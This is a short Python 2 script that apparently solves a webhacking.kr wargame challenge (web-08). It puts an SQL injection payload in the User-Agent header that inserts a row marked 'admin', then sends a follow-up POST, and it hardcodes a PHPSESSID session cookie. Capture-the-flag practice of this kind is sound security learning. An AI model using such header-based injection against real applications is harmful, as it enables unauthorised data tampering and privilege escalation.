#-*- coding: utf-8 -*-
import urllib2
import CookieManager

challengeUrl = "http://webhacking.kr/challenge/web/web-08/"

httpRequest = urllib2.Request(challengeUrl)
httpRequest.add_header("User-Agent", "agent', 'ip', 'admin'), ('test")
CookieManager.addCookie("PHPSESSID=da0bd6cb852292c17cc2364c9dc6d334") # webhacking.kr에 로그인 하고 나온 cookie
httpRequest.add_header("Cookie", CookieManager.getCookie())

httpResponse = urllib2.urlopen(httpRequest).read()
print httpResponse

httpRequest.add_header("User-Agent", "agent")
CookieManager.addCookie("PHPSESSID=da0bd6cb852292c17cc2364c9dc6d334") # webhacking.kr에 로그인 하고 나온 cookie
httpRequest.add_header("Cookie", CookieManager.getCookie())
httpRequest.get_method = lambda: 'POST'

httpResponse = urllib2.urlopen(httpRequest).read()
print httpResponse
